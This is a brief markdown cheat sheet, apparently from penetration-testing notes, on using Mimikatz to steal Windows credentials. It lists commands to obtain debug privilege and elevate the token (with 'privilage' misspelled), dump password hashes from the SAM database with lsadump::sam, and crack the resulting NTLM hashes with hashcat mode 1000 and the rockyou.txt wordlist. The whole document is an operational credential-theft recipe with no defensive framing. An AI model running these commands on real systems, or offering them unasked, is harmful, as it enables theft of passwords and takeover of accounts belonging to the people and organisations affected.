# Mimikatz

Always execute these commands before any action with mimikatz

```sh
privilage::debug
token::elevate
```

Dump hashes

```sh
lsadump::sam
lsadump::sam /path
```

Crack these hashes with hashcat

```sh
hashcat -m 1000 <hash> rockyou.txt
```
